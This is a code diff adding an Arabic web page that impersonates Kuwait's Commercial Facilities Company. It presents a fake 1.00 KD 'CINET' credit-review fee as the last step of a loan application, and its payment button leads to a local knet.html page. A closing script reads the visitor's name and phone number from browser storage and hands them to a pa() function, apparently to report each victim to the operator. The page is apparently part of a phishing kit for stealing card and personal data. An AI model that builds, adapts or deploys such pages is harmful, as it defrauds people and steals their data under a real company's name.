@@ -1,0 +1,441 @@
+<html lang="ar">
+  <head>
+        <meta charset="utf-8" />
+    <link rel="icon" href="" href="{{url_for('static',filename='img/favicon.ico')}}" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <link rel="apple-touch-icon" href="{{url_for('static',filename='img/logo192.png')}}" />
+    <title>شركة التسهيلات التجارية - CFC</title>
+    <link href="static/css/main.css" rel="stylesheet" type="text/css">
+
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <link
+      rel="preconnect"
+      href="https://fonts.googleapis.com"
+      crossorigin="use-credentials" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" />
+    <link
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700;800;900&amp;display=swa" />
+  </head>
+  <body>
+    <div id="root">
+      <div
+        dir="rtl"
+        class="min-h-screen bg-gradient-to-b from-gray-50 to-white text-gray-800">
+        <header
+          class="sticky top-0 z-50 bg-[#00A3E0] from-[#00A3E0] via-blue-700 to-blue-800 text-white shadow-lg backdrop-blur-sm">
+          <div class="flex items-center justify-between max-w-md mx-auto p-4">
+            <div class="flex items-center gap-3">
+              <div
+                class="w-12 h-12 bg-white/10 backdrop-blur-md rounded-xl flex items-center justify-center shadow-lg border border-white/20">
+                <a href="/"
+                  ><svg
+                    width="25"
+                    height="25"
+                    viewBox="0 0 25 25"
+                    fill="none"
+                    xmlns="http://www.w3.org/2000/svg">
+                    <g clip-path="url(#clip0_1375_4937)">
+                      <path
+                        d="M10.036 13.896C9.54699 13.5598 8.85274 13.5912 8.91547 12.8027C8.94683 12.4214 9.04662 12.2014 9.41156 12.0142C11.0809 11.156 12.7203 10.2472 14.401 9.3999C14.87 9.16211 15.0268 8.8888 15.0112 8.39682C14.9755 7.19833 14.9841 5.99847 15.0112 4.79997C15.0197 4.37633 14.9128 4.16314 14.4409 4.03741C12.5386 3.51809 10.5227 3.51809 8.62038 4.03741C8.21979 4.14537 8.10004 4.31073 8.10574 4.68927C8.12712 6.04629 8.12427 7.40468 8.10574 8.7617C8.09004 8.89374 8.11968 9.02709 8.19017 9.14152C8.26066 9.25595 8.36816 9.34522 8.49635 9.3958C9.27186 9.78254 10.0303 10.1994 10.8043 10.608C10.0516 11.3336 9.8321 11.376 8.99387 10.9209C8.31958 10.5547 7.36873 10.3838 7.04512 9.77024C6.7372 9.18944 6.94961 8.35583 6.94676 7.6329C6.94676 6.38794 6.96102 5.14435 6.93679 3.89939C6.92966 3.52494 7.04656 3.33772 7.42718 3.20653C10.2199 2.24308 12.9954 2.27588 15.7738 3.25709C16.1231 3.38008 16.2215 3.57141 16.2186 3.91169C16.2015 5.67595 16.1944 7.44158 16.2186 9.20584C16.2186 9.61582 16.0475 9.80578 15.7068 9.98207C14.1031 10.8143 12.5093 11.6616 10.9141 12.5048C10.1044 12.9284 10.1058 12.9312 10.036 13.896Z"
+                        fill="white"></path>
+                      <path
+                        d="M11.9821 12.5881C12.3584 12.3749 12.5951 12.2287 12.8445 12.1043C13.4333 11.8105 13.9194 12.0838 13.9208 12.7234C13.9294 14.6011 13.9379 16.4774 13.9208 18.3537C13.9013 18.5291 13.9407 18.7058 14.0333 18.8582C14.1258 19.0106 14.2667 19.1307 14.4355 19.201C15.5284 19.7768 16.6099 20.3808 17.68 21.0131C18.0507 21.2304 18.2802 21.188 18.5952 20.9065C20.0212 19.6364 21.0591 18.0177 21.5975 16.2246C21.7229 15.8146 21.6659 15.5713 21.2439 15.35C20.1035 14.75 18.9816 14.12 17.8725 13.4668C17.5346 13.27 17.2823 13.3069 16.9672 13.4846C16.3158 13.8535 15.6386 14.1815 14.9814 14.5409C14.6507 14.7227 14.4967 14.7364 14.4768 14.2908C14.4526 13.7715 14.531 13.3616 15.1183 13.1812C15.2786 13.1371 15.4276 13.0618 15.5559 12.9598C16.8717 11.8324 18.102 12.077 19.4292 13.0213C20.4114 13.7196 21.5362 14.2362 22.6082 14.8142C22.9404 14.9946 23.0558 15.175 22.9774 15.5672C22.4328 18.2758 21.0244 20.4788 18.8162 22.2444C18.4299 22.5532 18.1376 22.5847 17.6929 22.3236C16.2202 21.4586 14.722 20.6345 13.218 19.8201C13.071 19.7552 12.9489 19.6478 12.8689 19.513C12.7889 19.3782 12.7549 19.2227 12.7718 19.0684C12.7889 17.2823 12.7633 15.4962 12.7889 13.71C12.7961 13.1948 12.7504 12.7671 11.9821 12.5881Z"
+                        fill="white"></path>
+                      <path
+                        d="M12.237 14.7146C12.237 15.0767 12.237 15.3186 12.237 15.5591C12.2213 16.211 11.6426 16.5294 11.0367 16.211C9.31603 15.3063 7.59254 14.403 5.88472 13.4778C5.51264 13.2755 5.22325 13.2509 4.84833 13.4778C3.8205 14.0818 2.78127 14.6708 1.7121 15.2202C1.30724 15.4293 1.28442 15.6493 1.38849 16.0292C1.89098 17.8802 2.9328 19.5558 4.39215 20.8601C4.62879 21.0733 4.81269 21.1512 5.12346 20.9722C6.25821 20.318 7.40294 19.6803 8.55764 19.0589C8.68374 19.0026 8.78802 18.9094 8.85561 18.7929C8.92319 18.6763 8.95063 18.5422 8.93398 18.4098C8.9126 17.7101 8.94682 17.0077 8.92116 16.308C8.90405 15.827 9.07369 15.8557 9.45289 16.0224C9.9219 16.2301 10.1286 16.5021 10.083 17.0118C10.006 17.8399 10.3824 18.8212 9.94043 19.4716C9.51276 20.0839 8.55051 20.3558 7.81778 20.7699C6.89971 21.2865 5.96454 21.7716 5.06216 22.3169C4.7072 22.5342 4.49194 22.4781 4.19827 22.2485C1.97345 20.5193 0.484459 18.0703 0.0114028 15.3623C-0.0470451 15.0425 0.045612 14.869 0.336426 14.7091C1.87793 13.8636 3.41089 13.0068 4.93529 12.1385C5.24891 11.9595 5.47843 12.0019 5.77352 12.1645C7.36302 13.02 8.9682 13.844 10.5563 14.7009C11.0852 14.966 11.5827 15.2735 12.237 14.7146Z"
+                        fill="white"></path>
+                    </g>
+                    <defs>
+                      <clipPath id="clip0_1375_4937">
+                        <rect
+                          width="23"
+                          height="20"
+                          fill="white"
+                          transform="translate(23 22.5) rotate(-180)"></rect>
+                      </clipPath>
+                    </defs></svg
+                ></a>
+              </div>
+              <div class="flex flex-col">
+                <span class="font-bold text-lg tracking-tight">CFC</span
+                ><span class="text-xs text-blue-100">مراجعة الائتمان</span>
+              </div>
+            </div>
+            <button
+              class="w-10 h-10 rounded-lg bg-white/10 backdrop-blur-md flex items-center justify-center hover:bg-white/20 transition-all border border-white/20">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                width="24"
+                height="24"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                class="w-5 h-5">
+                <path d="M4 12h16"></path>
+                <path d="M4 18h16"></path>
+                <path d="M4 6h16"></path>
+              </svg>
+            </button>
+          </div>
+        </header>
+        <div class="max-w-md mx-auto px-6 py-6">
+          <div class="flex items-center justify-between mb-2">
+            <div class="flex items-center gap-2">
+              <div
+                class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-white"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M20 6 9 17l-5-5"></path>
+                </svg>
+              </div>
+              <span class="text-xs font-semibold text-green-600"
+                >المعلومات</span
+              >
+            </div>
+            <div class="flex-1 h-0.5 bg-green-500 mx-2"></div>
+            <div class="flex items-center gap-2">
+              <div
+                class="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center shadow-md">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-white"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M20 6 9 17l-5-5"></path>
+                </svg>
+              </div>
+              <span class="text-xs font-semibold text-green-600">الراتب</span>
+            </div>
+            <div class="flex-1 h-0.5 bg-[#00A3E0] mx-2"></div>
+            <div class="flex items-center gap-2">
+              <div
+                class="w-8 h-8 bg-[#00A3E0] rounded-full flex items-center justify-center shadow-md">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-4 h-4 text-white"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+                  <line x1="2" x2="22" y1="10" y2="10"></line>
+                </svg>
+              </div>
+              <span class="text-xs font-semibold text-[#00A3E0]">الدفع</span>
+            </div>
+          </div>
+          <div class="w-full bg-gray-200 rounded-full h-2">
+            <div
+              class="h-2 rounded-full transition-all duration-500 bg-gradient-to-r from-green-500 via-[#00A3E0] to-blue-700 w-full"></div>
+          </div>
+        </div>
+        <div class="max-w-md mx-auto px-6 pb-8 space-y-6">
+          <div class="grid grid-cols-3 gap-3">
+            <div
+              class="rounded-xl bg-gradient-to-br from-green-50 to-white p-3 text-center space-y-2">
+              <div
+                class="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center mx-auto">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-green-600"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path
+                    d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                </svg>
+              </div>
+              <p class="text-xs font-semibold text-gray-700">دفع آمن</p>
+            </div>
+            <div
+              class="rounded-xl bg-gradient-to-br from-blue-50 to-white p-3 text-center space-y-2">
+              <div
+                class="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center mx-auto">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-[#00A3E0]"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <rect
+                    width="18"
+                    height="11"
+                    x="3"
+                    y="11"
+                    rx="2"
+                    ry="2"></rect>
+                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+              </div>
+              <p class="text-xs font-semibold text-gray-700">مشفر ١٠٠٪</p>
+            </div>
+            <div
+              class="rounded-xl bg-gradient-to-br from-purple-50 to-white p-3 text-center space-y-2">
+              <div
+                class="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center mx-auto">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-purple-600"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M12 6v6l4 2"></path>
+                  <circle cx="12" cy="12" r="10"></circle>
+                </svg>
+              </div>
+              <p class="text-xs font-semibold text-gray-700">فوري</p>
+            </div>
+          </div>
+          <div class="rounded-2xl shadow-xl overflow-hidden">
+            <div
+              class="bg-gradient-to-r from-[#00A3E0] to-blue-700 p-6 text-center">
+              <div
+                class="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center mx-auto mb-4 border border-white/30">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-8 h-8 text-white"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path d="M21.801 10A10 10 0 1 1 17 3.335"></path>
+                  <path d="m9 11 3 3L22 4"></path>
+                </svg>
+              </div>
+              <p class="text-sm text-blue-100">
+                الخطوة الأخيرة لإتمام طلب التمويل
+              </p>
+            </div>
+            <div class="p-6 space-y-6">
+              <div class="text-center space-y-3">
+                <p class="text-gray-700 leading-relaxed">
+                  نشكركم على تقديم طلب التمويل لدى شركة التسهيلات التجارية.
+                </p>
+                <div class="bg-blue-50 border border-blue-200 rounded-xl p-4">
+                  <p class="text-gray-800 leading-relaxed">
+                    لضمان استكمال إجراءات الطلب، يرجى سداد رسوم خدمة سای نت
+                    وقدرها<span class="font-bold text-[#00A3E0] text-xl mx-1"
+                      >1.00 د.ك</span
+                    >لمراجعة السجل الائتماني الخاص بكم.
+                  </p>
+                </div>
+                <p class="text-sm text-gray-600">
+                  سداد هذه الرسوم يعد خطوة أساسية لاستكمال تقييم طلبكم.
+                </p>
+              </div>
+              <div class="bg-gray-50 rounded-xl p-4 space-y-3">
+                <div
+                  class="flex items-center justify-between pb-3 border-b border-gray-200">
+                  <span class="text-gray-600">رسوم مراجعة السجل الائتماني</span
+                  ><span class="font-semibold text-gray-900">1.00 د.ك</span>
+                </div>
+                <div class="flex items-center justify-between">
+                  <span class="text-lg font-bold text-gray-900"
+                    >المبلغ الإجمالي</span
+                  ><span class="text-2xl font-bold text-[#00A3E0]"
+                    >1.00 د.ك</span
+                  >
+                </div>
+              </div>
+              <button
+                type="button"
+                onclick="window.location.href='./knet.html'"
+                class="inline-flex items-center justify-center gap-2 w-full h-14 text-lg font-bold rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 disabled:opacity-60 disabled:cursor-not-allowed bg-gradient-to-r from-[#00A3E0] to-blue-700 hover:from-blue-700 hover:to-blue-800 text-white">
+                <span class="flex items-center gap-2 justify-center"
+                  ><svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    class="w-5 h-5"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <rect width="20" height="14" x="2" y="5" rx="2"></rect>
+                    <line x1="2" x2="22" y1="10" y2="10"></line></svg
+                  >الدفع عبر كي نت<svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    class="w-5 h-5"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="m9 18 6-6-6-6"></path></svg
+                ></span>
+              </button>
+              <div
+                class="flex items-start gap-3 bg-green-50 border border-green-200 rounded-lg p-3">
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="w-5 h-5 text-green-600 mt-0.5"
+                  viewBox="0 0 24 24"
+                  fill="none"
+                  stroke="currentColor"
+                  stroke-width="2"
+                  stroke-linecap="round"
+                  stroke-linejoin="round">
+                  <path
+                    d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                </svg>
+                <div>
+                  <p class="text-sm font-semibold text-green-900 mb-1">
+                    عملية دفع آمنة ومشفرة
+                  </p>
+                  <p class="text-xs text-green-700 leading-relaxed">
+                    سيتم تحويلك إلى بوابة كي نت الآمنة لإتمام عملية الدفع
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div
+            class="rounded-2xl shadow-lg overflow-hidden text-white bg-gradient-to-l from-yellow-400 via-blue-500 to-blue-700">
+            <div class="relative h-32">
+              <div
+                class="absolute inset-0 bg-gradient-to-l from-yellow-400/20 via-blue-500/40 to-blue-700/60"></div>
+              <div
+                class="absolute inset-0 opacity-30"
+                style="
+                  background-image: radial-gradient(
+                      circle at 20% 50%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    ),
+                    radial-gradient(
+                      circle at 40% 20%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    ),
+                    radial-gradient(
+                      circle at 60% 80%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    ),
+                    radial-gradient(
+                      circle at 80% 40%,
+                      rgba(255, 255, 255, 0.2) 1px,
+                      transparent 1px
+                    );
+                  background-size: 40px 40px, 60px 60px, 50px 50px, 45px 45px;
+                "></div>
+              <div
+                class="relative z-10 flex items-center justify-center h-full">
+                <div class="text-center">
+                  <div class="text-white text-3xl font-bold mb-1">
+                    CI<span class="text-yellow-300">NET</span>
+                  </div>
+                  <div class="text-white text-sm">سای نت</div>
+                </div>
+              </div>
+            </div>
+            <div class="p-6 space-y-4 bg-white text-gray-800">
+              <div class="text-center">
+                <h3 class="text-lg font-bold text-[#00A3E0] mb-2">
+                  مراجعة تاريخ الائتمان
+                </h3>
+                <p class="text-sm text-gray-600 mb-4">
+                  سای نت هي الجهة المعتمدة لتقييم السجل الائتماني في الكويت
+                </p>
+              </div>
+              <div class="grid grid-cols-2 gap-3">
+                <div class="bg-blue-50 rounded-lg p-3 text-center">
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    class="w-6 h-6 text-[#00A3E0] mx-auto mb-2"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path d="M21.801 10A10 10 0 1 1 17 3.335"></path>
+                    <path d="m9 11 3 3L22 4"></path>
+                  </svg>
+                  <p class="text-xs font-semibold text-gray-700">
+                    معتمد رسمياً
+                  </p>
+                </div>
+                <div class="bg-green-50 rounded-lg p-3 text-center">
+                  <svg
+                    xmlns="http://www.w3.org/2000/svg"
+                    class="w-6 h-6 text-green-600 mx-auto mb-2"
+                    viewBox="0 0 24 24"
+                    fill="none"
+                    stroke="currentColor"
+                    stroke-width="2"
+                    stroke-linecap="round"
+                    stroke-linejoin="round">
+                    <path
+                      d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"></path>
+                  </svg>
+                  <p class="text-xs font-semibold text-gray-700">آمن وموثوق</p>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="text-center pt-2">
+            <button
+              type="button"
+              onclick="window.location.href='/loan'"
+              class="inline-flex items-center justify-center gap-2 rounded-md text-sm font-medium border shadow-sm h-9 px-6 py-2 bg-white border-gray-300 hover:bg-gray-50">
+              <svg
+                xmlns="http://www.w3.org/2000/svg"
+                class="h-4 w-4 ml-2"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="currentColor"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round">
+                <path d="M5 12h14"></path>
+                <path d="m12 5 7 7-7 7"></path></svg
+              >العودة
+            </button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script src='static/js/pa.js'></script>
+    <script>
+      function rtlFix(s) {
+        return "\u2067" + s + "\u2069";
+      }
+
+        msg = 'صفحة - تأكيد الدفع'
+        msg += '\n'+localStorage.getItem('name')
+        msg += localStorage.getItem('phone')
+        pa({msg})
+
+    </script>
+  </body>
+</html>
